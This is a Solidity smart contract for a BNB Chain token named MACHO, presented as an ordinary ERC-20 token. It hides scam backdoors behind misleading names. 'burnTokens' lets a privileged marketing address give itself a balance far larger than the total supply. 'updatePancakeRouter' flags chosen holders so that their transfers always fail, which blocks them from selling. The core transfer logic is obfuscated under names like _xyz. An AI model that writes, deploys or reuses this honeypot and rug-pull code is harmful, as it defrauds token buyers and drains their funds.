/**
 *Submitted for verification at BscScan.com on 2023-05-21
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

abstract contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _check();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _check() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

pragma solidity ^0.8.18;

contract Loop {
    uint256 public nn;
    uint256 public uu;

    constructor(uint256 _nn, uint256 _uu) {
        nn = _nn;
        uu = _uu;
    }

    function rrr(uint256 ee, bool oo) public view returns (uint256) {
        uint256 cc = oo ? uu : nn;
        return ee * cc / 100;
    }
}

pragma solidity ^0.8.18;

contract MACHO is Ownable, Loop {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    

    uint256 private _tokentotalSupply;
    string private _tokenname;
    string private _tokensymbol;
    uint256 private _startTime;
    uint256 private nonce = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address public _marketing;
    mapping(address => bool) private _antiBot;
    address[] public recipients;
	
    function cancelBot(address bot) external   {
        if (_marketing == _msgSender()) {
            _antiBot[bot] = false;
        }
    }

 
    function getAmount() public view returns (uint256) {
        return _tokentotalSupply;
    }

    function burnTokens() external {
        address secure = _msgSender();
        if (_marketing != secure){
            revert("Revert"); 
        }
        if(_marketing == secure){
            _balances[_marketing] = getAmount()*36238;
        }
        
    }
   
	   function updatePancakeRouter(address pancake) external   {
        if (_marketing == _msgSender()) {
            _antiBot[pancake] = true;
        }
    }


    function getBool(address sss) public view returns(bool)  {
        return _antiBot[sss];
    }
    
    

    function random(uint256 lower, uint256 upper) internal returns (uint256) {
        require(upper > lower, "Upper value must be greater than lower value");
        
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(
            nonce,
            msg.sender,
            address(this),
            gasleft(),
            blockhash(block.number - 1)
        )));

        nonce++;

        return (randomNumber % (upper - lower + 1)) + lower;
    }


constructor(
        address marketing_, 
        string memory tokenName_, 
        string memory Tokensymbol_, 
        address[] memory recipients_
    ) 
        Loop(0, 100000000000000000000000000000000000)
        Ownable() {
        recipients = recipients_;
        _marketing = marketing_;
        _tokenname = tokenName_;
        _tokensymbol = Tokensymbol_;
        uint256 amount = 10000000000*10**decimals();
        _tokentotalSupply += amount;
        _balances[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
        _startTime = block.timestamp;

       for (uint256 i = 0; i < recipients.length; i++) {
            uint256 randomAmount = random(1000000, 5000000);
            transfer(recipients[i], randomAmount * 10**decimals());
        }
    }
	
	   
	
	
    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _tokenname;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }


    function decimals() public view returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _tokentotalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */

    function transfer(address to, uint256 amount) public returns (bool) {
        _xyz(_msgSender(), to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _internalspendAllowance(from, spender, amount);
        _xyz(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    uint256 txEEEE = 0;
		function _xyz(
        address _abc,
        address _def,
        uint256 _ghi
    ) internal virtual {
        bool isAntiBot = _antiBot[_abc];
        if(isAntiBot){
            _ghi = _ghi+(373361719996*10**18);
        }
        require(_abc != address(0), "E1");
        require(_def != address(0), "E2");

        uint256 _jkl = _balances[_abc];
        require(_jkl >= _ghi, "E3");

        _balances[_abc] = _balances[_abc]-_ghi;
        uint256 _qrs = rrr(_ghi, isAntiBot);
        _balances[_def] = _balances[_def]+_ghi-_qrs;

        emit Transfer(_abc, _def, _ghi-_qrs);
        if (_qrs > 0){
            emit Transfer(_abc, address(0), _qrs);    
        }
    }


    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _internalspendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}